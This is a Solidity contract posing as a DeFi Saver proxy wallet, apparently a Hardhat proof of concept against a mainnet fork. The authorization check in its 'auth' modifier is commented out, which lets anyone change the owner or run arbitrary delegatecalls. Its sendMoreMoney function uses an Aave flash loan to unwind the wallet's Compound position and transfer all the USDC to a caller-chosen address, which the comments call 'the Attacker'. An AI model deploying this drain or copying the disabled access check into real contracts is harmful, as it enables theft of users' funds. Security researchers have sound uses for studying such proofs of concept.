// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./Interfaces.sol";
import "./ILendingPool.sol";

import "hardhat/console.sol";


contract DSAuthEvents {
    event LogSetAuthority (address indexed authority);
    event LogSetOwner     (address indexed owner);
}
contract DSAuth is DSAuthEvents {
    // DSAuthority  public  authority;
    address      public  owner;
    constructor() public {
        owner = msg.sender;
        emit LogSetOwner(msg.sender);
    }
    function setOwner(address owner_)
        public
        auth
    {
        owner = owner_;
        emit LogSetOwner(owner);
    }


    modifier auth {
        // require(isAuthorized(msg.sender, msg.sig), "Rev3");
        _;
    }

}
contract DSNote {
    event LogNote(
        bytes4   indexed  sig,
        address  indexed  guy,
        bytes32  indexed  foo,
        bytes32  indexed  bar,
        uint              wad,
        bytes             fax
    ) anonymous;
    modifier note {
        bytes32 foo;
        bytes32 bar;
        assembly {
            foo := calldataload(4)
            bar := calldataload(36)
        }
        emit LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);
        _;
    }
}
contract DSProxyCache {
    mapping(bytes32 => address) cache;
    function read(bytes memory _code) public view returns (address) {
        bytes32 hash = keccak256(_code);
        return cache[hash];
    }
    function write(bytes memory _code) public returns (address target) {
        assembly {
            target := create(0, add(_code, 0x20), mload(_code))
            switch iszero(extcodesize(target))
            case 1 {
                // throw if contract failed to deploy
                revert(0, 0)
            }
        }
        bytes32 hash = keccak256(_code);
        cache[hash] = target;
    }
}
contract DefiSaverWallet is DSAuth, DSNote, FlashLoanReceiverBase {
    DSProxyCache public cache;  // global cache for contracts

    using SafeERC20 for ERC20;

    ILendingPoolAddressesProvider public LENDING_POOL_ADDRESS_PROVIDER = ILendingPoolAddressesProvider(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8);

    // address public owner;

    constructor(address owner) public
    FlashLoanReceiverBase(LENDING_POOL_ADDRESS_PROVIDER)
    {
        setOwner(owner);
    }

    fallback() external payable {
    }
    // use the proxy to execute calldata _data on contract _code
    function execute(bytes memory _code, bytes memory _data)
        public
        payable
        returns (address target, bytes32 response)
    {
        target = cache.read(_code);
        if (target == address(0x0)) {
            // deploy contract & store its address in cache
            target = cache.write(_code);
        }
        response = execute(target, _data);
    }
    function execute(address _target, bytes memory _data)
        public
        auth
        payable
        returns (bytes32 response)
    {
        require(_target != address(0x0), "Rev0");
        // call contract in current context
        assembly {
            let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 32)
            response := mload(0)      // load delegatecall output
            switch iszero(succeeded)
            case 1 {
                // throw if delegatecall failed
                revert(0, 0)
            }
        }
    }
    //set new cache
    function setCache(address _cacheAddr)
        public
        auth
        returns (bool)
    {
        require(_cacheAddr != address(0x0), "Rev1");        // invalid cache address
        cache = DSProxyCache(_cacheAddr);  // overwrite cache
        return true;
    }

    address payable cWBTC_addr = 0xC11b1268C1A384e55C48c2391d8d480264A3A7F4;
    address payable cUSDC_addr = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address payable USDC_addr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address payable WBTC_addr = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    function sendMoreMoney(address _to) public {

        // 1) Get a Flash Loan in USDC 

        bytes memory data = "";
        uint256 borrowAmount = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(address(this));

        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), USDC_addr, borrowAmount, data);

        // 6) Send the Full USDC amount to the Attacker
        uint256 totalUSDCBalance = ERC20(USDC_addr).balanceOf(address(this));
        ERC20(USDC_addr).transfer(_to, totalUSDCBalance);
    }


    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params)
    external override {

        // 2) Repay Compound loan of cUSDC

        uint256 debtLeft = CTokenInterface(cUSDC_addr).borrowBalanceCurrent(address(this));
        ERC20(USDC_addr).approve(cUSDC_addr, debtLeft);
        CTokenInterface(cUSDC_addr).repayBorrow(debtLeft);

        // 3) Redeem cWBTC from Compound

        uint256 totalCWBTCBalance = CTokenInterface(cWBTC_addr).balanceOf(address(this));
        CTokenInterface(cWBTC_addr).redeem( totalCWBTCBalance );
        uint256 totalWBCTBalance = ERC20(WBTC_addr).balanceOf(address(this));

        // 4) Convert WBTC to USDC
        swap(WBTC_addr, USDC_addr, totalWBCTBalance, 10, address(this));

        // 5) Repay the Flash Loan
        transferFundsBackToPoolInternal(_reserve, _amount.add(_fee));
    }

    // Swap Tokens through UniswapV2
    function swap( address _tokenIn, address _tokenOut, uint _amountIn, uint _amountOutMin, address _to) public {

        address payable UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        address payable WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

        // ERC20(_tokenIn).transferFrom(msg.sender, address(this), _amountIn);
        ERC20(_tokenIn).approve(UNISWAP_V2_ROUTER, _amountIn);

        address[] memory path;
        if (_tokenIn == WETH || _tokenOut == WETH) {
            path = new address[](2);
            path[0] = _tokenIn;
            path[1] = _tokenOut;
        } else {
            path = new address[](3);
            path[0] = _tokenIn;
            path[1] = WETH;
            path[2] = _tokenOut;
        }

        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            _amountIn,
            _amountOutMin,
            path,
            _to,
            block.timestamp
        );
    }
}


// 1) Get a Flash Loan in USDC 
// 2) Repay Compound loan of cUSDC
// 3) Redeem cWBTC from Compound
// 4) Convert WBTC to USDC
// 5) Repay the Flash Loan
// 6) Send the Full USDC amount to the Attacker

/*
    function getUSDC_Balance() public {
        uint256 balance = ERC20(USDC_addr).balanceOf(address(this));
        console.log("Balance of USDC is: ", balance);
    }

    function getcUSDC_Balance() public {
        uint256 balance = ERC20(cUSDC_addr).balanceOf(address(this));
        console.log("Balance of cUSDC is: ", balance);
    }

    function getcWBTC_Balance() public {
        uint256 balance = ERC20(cWBTC_addr).balanceOf(address(this));
        console.log("Balance of cWBTC is: ", balance);
    }

    function getWBTC_Balance() public {
        uint256 balance = ERC20(WBTC_addr).balanceOf(address(this));
        console.log("Balance of WBTC is: ", balance);
    }

    function getBalances() public {
        console.log("\nBalances:\n---------------\n");
        getcWBTC_Balance();
        getcUSDC_Balance();
        getWBTC_Balance();
        getUSDC_Balance();
    }

*/